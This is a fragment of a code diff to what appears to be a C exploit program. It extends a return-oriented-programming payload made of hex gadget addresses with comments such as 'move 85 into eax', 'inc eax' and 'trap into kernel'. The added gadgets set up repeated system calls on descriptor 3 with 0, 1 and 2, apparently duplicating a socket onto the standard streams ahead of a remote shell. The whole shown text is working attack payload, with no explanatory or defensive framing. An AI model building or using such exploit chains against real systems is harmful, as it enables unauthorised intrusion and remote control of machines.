@@ -84,16 +84,34 @@ int main(void)
                       "\x7E\xB8\xB6\xBB" // move edx (3 word) to stack
                       "\x22\xA4\xBA\xBB\x18\x2a\xbf\xbf" // pop the addy esp stores into ecx (future address of 3 word) 
                       "\x7E\xB8\xB6\xBB" // move edx (3 word) to stack
+                      "\xbe\xc6\xb6\xbb" // move 85 into eax
+                      "\x8C\x9C\xA9\xBB" // inc eax
+                      "\x8C\x9C\xA9\xBB" // inc eax
+                      "\x8C\x9C\xA9\xBB" // inc eax
+                      "\x8C\x9C\xA9\xBB" // inc eax
+                      "\x8C\x9C\xA9\xBB" // inc eax
                       "\xE5\xB6\xA9\xBB" // trap into kernel
                       "\x62\x26\xb4\xbb" // add 8 to esp to skip params on stack
                       "\xaa\xaa\xaa\xaa" // four-byte value 3
                       "\xaa\xaa\xaa\xaa" // four-byte value 0
                       ""
+                      "\xbe\xc6\xb6\xbb" // move 85 into eax
+                      "\x8C\x9C\xA9\xBB" // inc eax
+                      "\x8C\x9C\xA9\xBB" // inc eax
+                      "\x8C\x9C\xA9\xBB" // inc eax
+                      "\x8C\x9C\xA9\xBB" // inc eax
+                      "\x8C\x9C\xA9\xBB" // inc eax
                       "\xE5\xB6\xA9\xBB" // trap into kernel
                       "\x62\x26\xb4\xbb" // add 8 to esp to skip params on stack
                       "\xaa\xaa\xaa\xaa" // four-byte value 3
                       "\xaa\xaa\xaa\xaa" // four-byte value 1
                       ""
+                      "\xbe\xc6\xb6\xbb" // move 85 into eax
+                      "\x8C\x9C\xA9\xBB" // inc eax
+                      "\x8C\x9C\xA9\xBB" // inc eax
+                      "\x8C\x9C\xA9\xBB" // inc eax
+                      "\x8C\x9C\xA9\xBB" // inc eax
+                      "\x8C\x9C\xA9\xBB" // inc eax
                       "\xE5\xB6\xA9\xBB" // trap into kernel
                       "\x62\x26\xb4\xbb" // add 8 to esp to skip params on stack
                       "\xaa\xaa\xaa\xaa" // four-byte value 3
